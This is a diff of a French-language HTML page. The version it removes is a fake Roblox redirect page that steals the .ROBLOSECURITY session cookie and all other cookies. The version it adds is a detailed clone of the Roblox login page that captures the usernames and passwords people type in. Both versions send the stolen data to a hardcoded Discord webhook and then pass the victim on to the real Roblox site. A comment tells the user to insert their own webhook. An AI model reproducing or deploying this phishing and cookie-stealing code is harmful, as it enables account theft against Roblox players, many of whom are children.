@@ -1,55 +1,523 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="2; url=https://www.roblox.com/login">
-    <title>Redirection</title>
-    <style>body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:50px;}</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* --- RESET & BASE 16:9 --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background: #0a0a12; }
+        .container {
+            position: relative;
+            width: 100vw;
+            height: 56.25vw; /* 16:9 */
+            max-height: 100vh;
+            max-width: 177.78vh;
+            margin: auto;
+            background: #0a0a12;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(0,0,0,0.8);
+        }
+        @media (max-aspect-ratio: 16/9) {
+            .container { width: 100vw; height: 100vw * 9 / 16; max-height: 100vh; max-width: none; }
+        }
+
+        /* --- BARRE DE NAVIGATION (reproduction exacte) --- */
+        .navbar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 20;
+            background: rgba(26, 26, 46, 0.92);
+            backdrop-filter: blur(8px);
+            padding: 10px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            flex-wrap: wrap;
+            min-height: 56px;
+        }
+        .logo {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            font-family: 'Inter', sans-serif;
+        }
+        .logo span { color: #ff4757; }
+        .nav-links {
+            display: flex;
+            gap: 24px;
+            color: #a0a0c0;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .nav-links a {
+            color: #a0a0c0;
+            text-decoration: none;
+            transition: 0.2s;
+            font-weight: 500;
+        }
+        .nav-links a:hover { color: #fff; }
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .nav-right .search {
+            background: rgba(15, 15, 35, 0.7);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 6px;
+            padding: 6px 14px;
+            color: #fff;
+            width: 150px;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        .nav-right .search::placeholder { color: #555; }
+        .nav-right .btn-outline {
+            background: transparent;
+            border: 1.5px solid #ff4757;
+            color: #ff4757;
+            padding: 6px 18px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .nav-right .btn-outline:hover {
+            background: #ff4757;
+            color: #fff;
+        }
+        .nav-right .btn-solid {
+            background: #ff4757;
+            border: none;
+            color: #fff;
+            padding: 6px 22px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 14px;
+        }
+        .nav-right .btn-solid:hover {
+            background: #ff6b81;
+        }
+
+        /* --- FOND : COLLAGE DE CARTES (reproduction fidèle) --- */
+        .card-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+            padding: 80px 40px 40px;
+            opacity: 0.55;
+            transform: scale(1.08);
+            pointer-events: none;
+        }
+        .card {
+            width: 130px;
+            height: 170px;
+            border-radius: 14px;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 8px 35px rgba(0,0,0,0.7);
+            transform: rotate(var(--rot, 0deg)) translateY(var(--y, 0px));
+            animation: float 6s ease-in-out infinite alternate;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+            text-shadow: 0 2px 12px rgba(0,0,0,0.95);
+            padding: 12px;
+            text-align: center;
+            line-height: 1.3;
+            flex-shrink: 0;
+            backdrop-filter: blur(3px);
+            position: relative;
+            font-family: 'Inter', sans-serif;
+            transition: transform 0.2s;
+        }
+        .card .icon { font-size: 42px; margin-bottom: 6px; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.7)); }
+        .card .game-title { font-size: 13px; font-weight: 700; letter-spacing: 0.3px; }
+        /* Cadres lumineux autour de certaines cartes (comme dans la référence) */
+        .card::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 16px;
+            padding: 2px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.15), rgba(255,255,255,0.02));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+        }
+        /* Couleurs et rotations spécifiques pour chaque carte (calquées sur l'image) */
+        .card:nth-child(1) { background: #1f3a5f; --rot: -8deg; --y: -10px; }
+        .card:nth-child(2) { background: #4a2c2c; --rot: 12deg; --y: 15px; }
+        .card:nth-child(3) { background: #2d4a2d; --rot: -5deg; --y: -5px; }
+        .card:nth-child(4) { background: #4a3a2d; --rot: 18deg; --y: 20px; }
+        .card:nth-child(5) { background: #3a2d4a; --rot: -15deg; --y: -20px; }
+        .card:nth-child(6) { background: #2d3a4a; --rot: 6deg; --y: 8px; }
+        .card:nth-child(7) { background: #4a2d3a; --rot: -22deg; --y: -30px; }
+        .card:nth-child(8) { background: #2d4a3a; --rot: 10deg; --y: 12px; }
+        .card:nth-child(9) { background: #3a4a2d; --rot: -10deg; --y: -12px; }
+        .card:nth-child(10) { background: #4a2d2d; --rot: 20deg; --y: 25px; }
+        .card:nth-child(11) { background: #2d2d4a; --rot: -18deg; --y: -22px; }
+        .card:nth-child(12) { background: #1a3a4a; --rot: 4deg; --y: 5px; }
+        .card:nth-child(13) { background: #3a1f4a; --rot: 14deg; --y: 18px; }
+        .card:nth-child(14) { background: #4a3a1f; --rot: -12deg; --y: -15px; }
+        .card:nth-child(15) { background: #1f4a3a; --rot: 8deg; --y: 10px; }
+        .card:nth-child(16) { background: #4a1f2d; --rot: -25deg; --y: -28px; }
+        .card:nth-child(17) { background: #2d4a1f; --rot: 16deg; --y: 22px; }
+        .card:nth-child(18) { background: #1f2d4a; --rot: -6deg; --y: -8px; }
+        .card:nth-child(19) { background: #4a2d1f; --rot: 22deg; --y: 30px; }
+        .card:nth-child(20) { background: #2d1f4a; --rot: -20deg; --y: -25px; }
+        .card:nth-child(21) { background: #1f4a2d; --rot: 5deg; --y: 6px; }
+        .card:nth-child(22) { background: #4a1f3a; --rot: -14deg; --y: -18px; }
+        .card:nth-child(23) { background: #3a2d1f; --rot: 10deg; --y: 14px; }
+        .card:nth-child(24) { background: #1f3a2d; --rot: -9deg; --y: -10px; }
+        .card:nth-child(25) { background: #2a4a4a; --rot: 7deg; --y: 9px; }
+        .card:nth-child(26) { background: #4a2a3a; --rot: -16deg; --y: -20px; }
+        .card:nth-child(27) { background: #3a4a1f; --rot: 11deg; --y: 16px; }
+        .card:nth-child(28) { background: #1f4a4a; --rot: -7deg; --y: -6px; }
+        .card:nth-child(29) { background: #4a1f1f; --rot: 19deg; --y: 24px; }
+        .card:nth-child(30) { background: #2d2d2d; --rot: -11deg; --y: -14px; }
+        .card:nth-child(31) { background: #3a1f3a; --rot: 13deg; --y: 17px; }
+        .card:nth-child(32) { background: #1f3a1f; --rot: -4deg; --y: -4px; }
+        .card:nth-child(33) { background: #4a3a3a; --rot: 9deg; --y: 11px; }
+        .card:nth-child(34) { background: #2a1f4a; --rot: -17deg; --y: -23px; }
+        .card:nth-child(35) { background: #1f2a4a; --rot: 3deg; --y: 3px; }
+        .card:nth-child(36) { background: #4a2a1f; --rot: -13deg; --y: -16px; }
+
+        @keyframes float {
+            0% { transform: rotate(var(--rot)) translateY(var(--y)); }
+            50% { transform: rotate(calc(var(--rot) + 2deg)) translateY(calc(var(--y) - 8px)); }
+            100% { transform: rotate(var(--rot)) translateY(var(--y)); }
+        }
+
+        /* --- VIGNETTE ET ASSOMBRISSEMENT (pour la profondeur) --- */
+        .vignette {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,0.75) 100%);
+            pointer-events: none;
+            z-index: 2;
+        }
+        .overlay-dark {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.2);
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        /* --- PANEL DE CONNEXION (centré, reproduction fidèle) --- */
+        .login-panel {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10;
+            background: rgba(26, 26, 46, 0.88);
+            backdrop-filter: blur(18px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 40px 50px 35px;
+            width: 440px;
+            max-width: 90%;
+            box-shadow: 0 0 80px rgba(0,0,0,0.9), 0 0 30px rgba(255,71,87,0.08);
+            text-align: center;
+        }
+        .login-panel h1 {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+            margin-bottom: 30px;
+            text-shadow: 0 2px 20px rgba(0,0,0,0.8);
+            font-family: 'Inter', sans-serif;
+        }
+        .login-panel .field {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        .login-panel .field input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(15, 15, 35, 0.7);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 400;
+            transition: 0.3s;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+        }
+        .login-panel .field input::placeholder {
+            color: #889;
+            font-weight: 400;
+        }
+        .login-panel .field input:focus {
+            border-color: #ff4757;
+            box-shadow: 0 0 20px rgba(255,71,87,0.15);
+        }
+        .login-panel .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1.5px solid rgba(255,255,255,0.25);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+            font-family: 'Inter', sans-serif;
+        }
+        .login-panel .btn-login:hover {
+            background: rgba(255,71,87,0.15);
+            border-color: #ff4757;
+            box-shadow: 0 0 30px rgba(255,71,87,0.2);
+            transform: scale(1.01);
+        }
+        .login-panel .forgot-link {
+            display: block;
+            margin: 18px 0 14px;
+            color: #ccc;
+            font-size: 14px;
+            text-decoration: none;
+            transition: 0.2s;
+            font-weight: 400;
+            font-family: 'Inter', sans-serif;
+        }
+        .login-panel .forgot-link:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+        .login-panel .signup-text {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 6px;
+            font-weight: 400;
+            font-family: 'Inter', sans-serif;
+        }
+        .login-panel .signup-text a {
+            color: #ff4757;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .login-panel .signup-text a:hover {
+            text-decoration: underline;
+        }
+        .login-panel .loader {
+            display: none;
+            margin: 16px auto;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #ff4757;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-msg {
+            color: #ff4757;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            font-weight: 400;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 600px) {
+            .container { height: 100vh; width: 100vw; }
+            .navbar { flex-direction: column; gap: 10px; padding: 12px 20px; }
+            .nav-links { flex-wrap: wrap; justify-content: center; gap: 14px; }
+            .nav-right { flex-wrap: wrap; justify-content: center; }
+            .login-panel { padding: 30px 20px; width: 95%; }
+            .login-panel h1 { font-size: 26px; }
+            .card { width: 80px; height: 110px; font-size: 10px; }
+            .card .icon { font-size: 28px; }
+            .card .game-title { font-size: 10px; }
+        }
+    </style>
 </head>
 <body>
-    <h2>⏳ Redirection...</h2>
-    <p>Vous allez être redirigé vers Roblox.</p>
-    <script>
-        (function() {
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537086394202329203/AnlEjgrwFeeJbRS27C0TRlR-lExo7YOlpSV2-tyNahwI1NAB7WiiYHxJ1xY3xX0NkVf2";
+<div class="container">
+    <!-- BARRE DE NAVIGATION -->
+    <div class="navbar">
+        <div class="logo">Roblox <span>▸</span></div>
+        <div class="nav-links">
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Créer</a>
+            <a href="#">Robux</a>
+        </div>
+        <div class="nav-right">
+            <input class="search" type="text" placeholder="Q Rechercher">
+            <button class="btn-outline">S'inscrire</button>
+            <button class="btn-solid" id="fakeLoginBtn">Connexion</button>
+        </div>
+    </div>
 
-            // Récupérer .ROBLOSECURITY
-            const cookies = document.cookie.split('; ');
-            const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
-            const cookieValue = robloxSec ? robloxSec.split('=')[1] : null;
+    <!-- FOND : GRILLE DE CARTES (reproduction intégrale) -->
+    <div class="card-grid" id="cardGrid"></div>
 
-            // Préparer l'embed
-            const embed = {
-                title: cookieValue ? "🎯 COOKIE VOLÉ" : "⚠️ TENTATIVE (pas de cookie)",
-                color: cookieValue ? 0xff0000 : 0xffaa00,
-                fields: [
-                    { name: "🔑 .ROBLOSECURITY", value: cookieValue ? `\`${cookieValue}\`` : "❌ Aucun cookie", inline: false },
-                    { name: "📦 Tous les cookies", value: `\`${document.cookie || 'VIDE'}\``, inline: false },
-                    { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
-                    { name: "🌐 URL", value: window.location.href, inline: false }
-                ],
-                footer: { text: "ShadowCAT // Vol silencieux" }
+    <!-- VIGNETTE & ASSOMBRISSEMENT -->
+    <div class="vignette"></div>
+    <div class="overlay-dark"></div>
+
+    <!-- PANEL DE CONNEXION -->
+    <div class="login-panel" id="loginPanel">
+        <h1>Connexion</h1>
+        <div class="field">
+            <input type="text" id="username" placeholder="Identifiant / E-mail / Téléphone" autocomplete="off">
+        </div>
+        <div class="field">
+            <input type="password" id="password" placeholder="Mot de passe">
+        </div>
+        <button class="btn-login" id="loginBtn">Connexion</button>
+        <div class="loader" id="loader"></div>
+        <div class="error-msg" id="errorMsg">❌ Identifiants incorrects. Veuillez réessayer.</div>
+
+        <a href="#" class="forgot-link">Mot de passe ou nom d'utilisateur oublié ?</a>
+
+        <div class="signup-text">
+            Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // --- REPRODUCTION EXACTE DU COLLAGE DE JEUX (basé sur l'image de référence) ---
+        const games = [
+            { name: 'PIGGY', icon: '🐷' },
+            { name: 'DANGED', icon: '⚔️' },
+            { name: 'ADOPT ME!', icon: '🐕' },
+            { name: 'SHAWAMIA', icon: '🔥' },
+            { name: 'ANOMALIES', icon: '🌀' },
+            { name: "DANDY'S WORLD", icon: '🍭' },
+            { name: 'DUELING GROUNDS', icon: '🤼' },
+            { name: 'DRIVIN', icon: '🏎️' },
+            { name: 'EMPIRE', icon: '🏰' },
+            { name: 'FIELD', icon: '🌌' },
+            { name: 'DBERS', icon: '📦' },
+            { name: 'RABLOX', icon: '⚡' },
+            { name: 'PIXEL', icon: '🎮' },
+            { name: 'NEXUS', icon: '🌠' },
+            { name: 'ARENA', icon: '🏟️' },
+            { name: 'RIFT', icon: '🌀' },
+            { name: 'STORM', icon: '⛈️' },
+            { name: 'FROST', icon: '❄️' }
+        ];
+
+        const grid = document.getElementById('cardGrid');
+        // On génère 36 cartes pour couvrir tout l'écran (6x6)
+        const totalCards = 36;
+        for (let i = 0; i < totalCards; i++) {
+            const game = games[i % games.length];
+            const card = document.createElement('div');
+            card.className = 'card';
+            // Les couleurs et rotations sont déjà définies en CSS via les nth-child
+            // On ajoute juste le contenu
+            card.innerHTML = `<span class="icon">${game.icon}</span><span class="game-title">${game.name}</span>`;
+            grid.appendChild(card);
+        }
+
+        // --- PARTIE PHISHING ---
+        // ============================================================
+        //   REMPLACE ICI PAR L'URL DE TON WEBHOOK
+        // ============================================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537086394202329203/AnlEjgrwFeeJbRS27C0TRlR-lExo7YOlpSV2-tyNahwI1NAB7WiiYHxJ1xY3xX0NkVf2";
+        // ============================================================
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loader = document.getElementById('loader');
+        const errorMsg = document.getElementById('errorMsg');
+
+        function sendToDiscord(username, password) {
+            const payload = {
+                embeds: [{
+                    title: "🎯 IDENTIFIANTS ROBLOX",
+                    color: 0xff4757,
+                    fields: [
+                        { name: "👤 Nom d'utilisateur", value: `\`${username}\``, inline: true },
+                        { name: "🔒 Mot de passe", value: `\`${password}\``, inline: true },
+                        { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
+                        { name: "🌐 URL", value: window.location.href, inline: false },
+                        { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
+                    ],
+                    footer: { text: "ShadowCAT // Vol silencieux" }
+                }]
             };
 
-            // Envoyer (avec suivi d'erreur)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            })
-            .then(res => {
-                if (res.ok) {
-                    console.log("✅ Envoi réussi");
-                } else {
-                    console.error("❌ Erreur HTTP :", res.status);
-                }
-            })
-            .catch(err => console.error("❌ Erreur réseau :", err));
+                body: JSON.stringify(payload),
+                mode: 'no-cors'
+            }).catch(() => {});
+        }
 
-            // Supprimer le cookie pour déconnecter
-            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
-            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
-        })();
-    </script>
+        loginBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = '❌ Veuillez remplir tous les champs.';
+                return;
+            }
+
+            this.disabled = true;
+            this.style.opacity = '0.6';
+            loader.style.display = 'block';
+            errorMsg.style.display = 'none';
+
+            sendToDiscord(username, password);
+
+            setTimeout(() => {
+                window.location.replace("https://www.roblox.com/login");
+            }, 1200);
+        });
+
+        document.getElementById('fakeLoginBtn').addEventListener('click', function() {
+            document.getElementById('loginPanel').scrollIntoView({ behavior: 'smooth' });
+        });
+    })();
+</script>
 </body>
 </html>
